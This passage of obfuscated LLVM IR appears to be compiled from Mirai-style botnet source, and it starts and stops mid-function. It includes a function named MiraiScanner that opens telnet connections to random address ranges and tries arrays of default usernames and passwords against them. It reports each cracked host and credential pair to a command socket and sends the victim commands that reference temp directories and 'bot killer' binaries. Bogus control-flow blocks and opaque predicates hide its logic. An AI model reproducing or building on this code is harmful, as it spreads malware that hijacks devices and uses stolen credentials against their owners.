  %1455 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %1455, align 8
  %1456 = load i32, i32* %3, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %1457, i64* %1458, align 8
  %1459 = load i32, i32* %6, align 4
  %1460 = sext i32 %1459 to i64
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1460
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1461, i32 0, i32 0
  %1463 = load i32, i32* %1462, align 16
  %_59 = sub i32 %1463, 1
  %gen60 = mul i32 %_59, 1
  %_61 = sub i32 0, %1463
  %gen62 = add i32 %_61, 1
  %_63 = sub i32 %1463, 1
  %gen64 = mul i32 %_63, 1
  %_65 = shl i32 %1463, 1
  %_66 = sub i32 0, %1463
  %gen67 = add i32 %_66, 1
  %_68 = shl i32 %1463, 1
  %_69 = sub i32 0, %1463
  %gen70 = add i32 %_69, 1
  %_71 = shl i32 %1463, 1
  %1464 = add nsw i32 %1463, 1
  %1465 = call i32 @select(i32 %1464, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %1465, i32* %7, align 4
  %1466 = load i32, i32* %7, align 4
  %1467 = icmp eq i32 %1466, 1
  br label %originalBB26

originalBB75alteredBB:                            ; preds = %originalBB75, %405
  %1468 = load i32, i32* %6, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1470, i32 0, i32 7
  store i32 0, i32* %1471, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %1472 = load i32, i32* %6, align 4
  %1473 = sext i32 %1472 to i64
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 0
  %1476 = load i32, i32* %1475, align 16
  %1477 = bitcast i32* %15 to i8*
  %1478 = call i32 @getsockopt(i32 %1476, i32 1, i32 4, i8* %1477, i32* %14) #5
  %1479 = load i32, i32* %15, align 4
  %1480 = icmp ne i32 %1479, 0
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %457
  %1481 = load i32, i32* %7, align 4
  %1482 = icmp eq i32 %1481, -1
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %524
  %1483 = load i32, i32* %6, align 4
  %1484 = sext i32 %1483 to i64
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1484
  call void @advance_telstate(%struct.telstate_t* %1485, i32 0)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %548
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %609
  %1486 = load i32, i32* %6, align 4
  %1487 = sext i32 %1486 to i64
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 0
  %1490 = load i32, i32* %1489, align 16
  %1491 = call i64 @send(i32 %1490, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %1492 = icmp slt i64 %1491, 0
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %633
  %1493 = load i32, i32* %6, align 4
  %1494 = sext i32 %1493 to i64
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1494
  call void @reset_telstate(%struct.telstate_t* %1495)
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %704
  %1496 = load i32, i32* %6, align 4
  %1497 = sext i32 %1496 to i64
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1497
  call void @reset_telstate(%struct.telstate_t* %1498)
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %750
  %1499 = load i32, i32* %6, align 4
  %1500 = sext i32 %1499 to i64
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1500
  call void @reset_telstate(%struct.telstate_t* %1501)
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %778
  %1502 = load i32, i32* %6, align 4
  %1503 = sext i32 %1502 to i64
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1503
  call void @reset_telstate(%struct.telstate_t* %1504)
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %830
  %1505 = load i32, i32* %6, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1506
  call void @advance_telstate(%struct.telstate_t* %1507, i32 0)
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %858
  %1508 = load i32, i32* %6, align 4
  %1509 = sext i32 %1508 to i64
  %1510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1509
  %1511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1510, i32 0, i32 3
  %1512 = load i8, i8* %1511, align 1
  %1513 = zext i8 %1512 to i32
  %1514 = icmp eq i32 %1513, 2
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %912
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %929
  %1515 = load i32, i32* %6, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1516
  call void @reset_telstate(%struct.telstate_t* %1517)
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %949
  br label %originalBB127

originalBB131alteredBB:                           ; preds = %originalBB131, %967
  %1518 = load i32, i32* %6, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1519
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1520, i32 0, i32 7
  %1522 = load i32, i32* %1521, align 16
  %_132 = shl i32 %1522, 7
  %_133 = sub i32 %1522, 7
  %gen134 = mul i32 %_133, 7
  %1523 = add i32 %1522, 7
  %1524 = zext i32 %1523 to i64
  %1525 = call i64 @time(i64* null) #5
  %1526 = icmp slt i64 %1524, %1525
  br label %originalBB131

originalBB138alteredBB:                           ; preds = %originalBB138, %998
  %1527 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1528 = call i32 (i8*, i8*, ...) @sprintf(i8* %1527, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1529 = load i32, i32* %6, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 0
  %1533 = load i32, i32* %1532, align 16
  %1534 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1535 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1536 = call i64 @strlen(i8* %1535) #9
  %1537 = call i64 @send(i32 %1533, i8* %1534, i64 %1536, i32 16384)
  %1538 = icmp slt i64 %1537, 0
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1027
  %1539 = load i32, i32* %6, align 4
  %1540 = sext i32 %1539 to i64
  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1540
  call void @reset_telstate(%struct.telstate_t* %1541)
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1047
  call void @RemoveTempDirs()
  %1542 = load i32, i32* @mainCommSock, align 4
  %1543 = load i32, i32* %6, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1544
  %1546 = call i8* @get_telstate_host(%struct.telstate_t* %1545)
  %1547 = load i32, i32* %6, align 4
  %1548 = sext i32 %1547 to i64
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1548
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1549, i32 0, i32 4
  %1551 = load i8, i8* %1550, align 2
  %1552 = zext i8 %1551 to i64
  %1553 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1552
  %1554 = load i8*, i8** %1553, align 8
  %1555 = load i32, i32* %6, align 4
  %1556 = sext i32 %1555 to i64
  %1557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1556
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1557, i32 0, i32 5
  %1559 = load i8, i8* %1558, align 1
  %1560 = zext i8 %1559 to i64
  %1561 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1560
  %1562 = load i8*, i8** %1561, align 8
  %1563 = call i32 (i32, i8*, ...) @sockprintf(i32 %1542, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i32 0, i32 0), i8* %1546, i8* %1554, i8* %1562)
  %1564 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1565 = call i32 (i8*, i8*, ...) @sprintf(i8* %1564, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %1566 = load i32, i32* %6, align 4
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1567
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1568, i32 0, i32 0
  %1570 = load i32, i32* %1569, align 16
  %1571 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1572 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1573 = call i64 @strlen(i8* %1572) #9
  %1574 = call i64 @send(i32 %1570, i8* %1571, i64 %1573, i32 16384)
  %1575 = icmp slt i64 %1574, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1102
  %1576 = load i32, i32* @mainCommSock, align 4
  %1577 = load i32, i32* %6, align 4
  %1578 = sext i32 %1577 to i64
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1578
  %1580 = call i8* @get_telstate_host(%struct.telstate_t* %1579)
  %1581 = load i32, i32* %6, align 4
  %1582 = sext i32 %1581 to i64
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1582
  %1584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1583, i32 0, i32 4
  %1585 = load i8, i8* %1584, align 2
  %1586 = zext i8 %1585 to i64
  %1587 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1586
  %1588 = load i8*, i8** %1587, align 8
  %1589 = load i32, i32* %6, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 5
  %1593 = load i8, i8* %1592, align 1
  %1594 = zext i8 %1593 to i64
  %1595 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1594
  %1596 = load i8*, i8** %1595, align 8
  %1597 = call i32 (i32, i8*, ...) @sockprintf(i32 %1576, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i32 0, i32 0), i8* %1580, i8* %1588, i8* %1596)
  %1598 = load i32, i32* %6, align 4
  %1599 = sext i32 %1598 to i64
  %1600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1599
  call void @advance_telstate(%struct.telstate_t* %1600, i32 8)
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1144
  %1601 = call i64 @time(i64* null) #5
  %1602 = trunc i64 %1601 to i32
  %1603 = load i32, i32* %6, align 4
  %1604 = sext i32 %1603 to i64
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1604
  %1606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1605, i32 0, i32 7
  store i32 %1602, i32* %1606, align 16
  %1607 = load i32, i32* %6, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 0
  %1611 = load i32, i32* %1610, align 16
  %1612 = call i64 @send(i32 %1611, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i32 0, i32 0), i64 4, i32 16384)
  %1613 = icmp slt i64 %1612, 0
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1183
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1251
  %1614 = load i32, i32* %6, align 4
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1615
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1616, i32 0, i32 9
  %1618 = load i8*, i8** %1617, align 8
  %1619 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1618, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i32 0, i32 0))
  %1620 = icmp ne i32 %1619, 0
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1283
  %1621 = load i32, i32* @mainCommSock, align 4
  %1622 = load i32, i32* %6, align 4
  %1623 = sext i32 %1622 to i64
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1623
  %1625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1624, i32 0, i32 1
  %1626 = bitcast i32* %1625 to %struct.in_addr*
  %1627 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1626, i32 0, i32 0
  %1628 = load i32, i32* %1627, align 4
  %1629 = call i8* @inet_ntoa(i32 %1628) #5
  %1630 = load i32, i32* %6, align 4
  %1631 = sext i32 %1630 to i64
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 4
  %1634 = load i8, i8* %1633, align 2
  %1635 = zext i8 %1634 to i64
  %1636 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %1635
  %1637 = load i8*, i8** %1636, align 8
  %1638 = load i32, i32* %6, align 4
  %1639 = sext i32 %1638 to i64
  %1640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1639
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1640, i32 0, i32 5
  %1642 = load i8, i8* %1641, align 1
  %1643 = zext i8 %1642 to i64
  %1644 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %1643
  %1645 = load i8*, i8** %1644, align 8
  %1646 = call i32 (i32, i8*, ...) @sockprintf(i32 %1621, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i32 0, i32 0), i8* %1629, i8* %1637, i8* %1645)
  %1647 = load i32, i32* %6, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1648
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1649, i32 0, i32 3
  store i8 3, i8* %1650, align 1
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1377
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1394
  %1651 = load i32, i32* %6, align 4
  %_175 = sub i32 %1651, 1
  %gen176 = mul i32 %_175, 1
  %_177 = shl i32 %1651, 1
  %_178 = shl i32 %1651, 1
  %_179 = sub i32 %1651, 1
  %gen180 = mul i32 %_179, 1
  %_181 = sub i32 %1651, 1
  %gen182 = mul i32 %_181, 1
  %_183 = sub i32 0, %1651
  %gen184 = add i32 %_183, 1
  %1652 = add nsw i32 %1651, 1
  store i32 %1652, i32* %6, align 4
  br label %originalBB174
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  br label %32

; <label>:32:                                     ; preds = %30, %2
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 1025) #5
  store i8* %38, i8** %17, align 8
  %39 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1025, i32 1, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %19, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %48

; <label>:48:                                     ; preds = %66, %32
  %49 = load i32, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %54
  %56 = bitcast %struct.telstate_t* %55 to i8*
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 32, i32 16, i1 false)
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 3
  store i8 1, i8* %60, align 1
  %61 = load i8*, i8** %17, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %63
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i32 0, i32 9
  store i8* %61, i8** %65, align 8
  br label %66

; <label>:66:                                     ; preds = %52
  %67 = load i32, i32* %6, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %6, align 4
  br label %48

; <label>:69:                                     ; preds = %48
  %70 = load i32, i32* @x.73
  %71 = load i32, i32* @y.74
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %69
  %78 = load i32, i32* @x.73
  %79 = load i32, i32* @y.74
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %86

; <label>:86:                                     ; preds = %1391, %originalBBpart2
  br label %87

; <label>:87:                                     ; preds = %86
  store i32 0, i32* %6, align 4
  br label %88

; <label>:88:                                     ; preds = %1388, %87
  %89 = load i32, i32* %6, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %89, %90
  br i1 %91, label %92, label %1391

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 7
  %97 = load i32, i32* %96, align 16
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %122

; <label>:99:                                     ; preds = %92
  %100 = load i32, i32* @x.73
  %101 = load i32, i32* @y.74
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %99
  %108 = call i64 @time(i64* null) #5
  %109 = trunc i64 %108 to i32
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %111
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %112, i32 0, i32 7
  store i32 %109, i32* %113, align 16
  %114 = load i32, i32* @x.73
  %115 = load i32, i32* @y.74
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %122

; <label>:122:                                    ; preds = %originalBBpart24, %92
  %123 = load i32, i32* %6, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 8
  %128 = zext i8 %127 to i32
  switch i32 %128, label %1387 [
    i32 0, label %129
    i32 1, label %361
    i32 2, label %530
    i32 3, label %630
    i32 4, label %739
    i32 5, label %839
    i32 6, label %900
    i32 7, label %1080
    i32 8, label %1178
  ]

; <label>:129:                                    ; preds = %122
  %130 = load i32, i32* @x.73
  %131 = load i32, i32* @y.74
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %129
  %138 = load i32, i32* %6, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 3
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 1
  %145 = load i32, i32* @x.73
  %146 = load i32, i32* @y.74
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %144, label %153, label %189

; <label>:153:                                    ; preds = %originalBBpart28
  %154 = load i32, i32* @x.73
  %155 = load i32, i32* @y.74
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %153
  %162 = load i32, i32* %6, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 9
  %166 = load i8*, i8** %165, align 8
  store i8* %166, i8** %20, align 8
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %168
  %170 = bitcast %struct.telstate_t* %169 to i8*
  call void @llvm.memset.p0i8.i64(i8* %170, i8 0, i64 32, i32 16, i1 false)
  %171 = load i8*, i8** %20, align 8
  %172 = load i32, i32* %6, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 9
  store i8* %171, i8** %175, align 8
  %176 = call i32 @MiraiIPRanges()
  %177 = load i32, i32* %6, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 1
  store i32 %176, i32* %180, align 4
  %181 = load i32, i32* @x.73
  %182 = load i32, i32* @y.74
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %269

; <label>:189:                                    ; preds = %originalBBpart28
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 3
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 0
  br i1 %196, label %197, label %252

; <label>:197:                                    ; preds = %189
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 4
  %202 = load i8, i8* %201, align 2
  %203 = add i8 %202, 1
  store i8 %203, i8* %201, align 2
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 5
  %208 = load i8, i8* %207, align 1
  %209 = add i8 %208, 1
  store i8 %209, i8* %207, align 1
  %210 = load i32, i32* %6, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 5
  %214 = load i8, i8* %213, align 1
  %215 = zext i8 %214 to i64
  %216 = icmp eq i64 %215, 35
  br i1 %216, label %217, label %222

; <label>:217:                                    ; preds = %197
  %218 = load i32, i32* %6, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 3
  store i8 1, i8* %221, align 1
  br label %222

; <label>:222:                                    ; preds = %217, %197
  %223 = load i32, i32* @x.73
  %224 = load i32, i32* @y.74
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
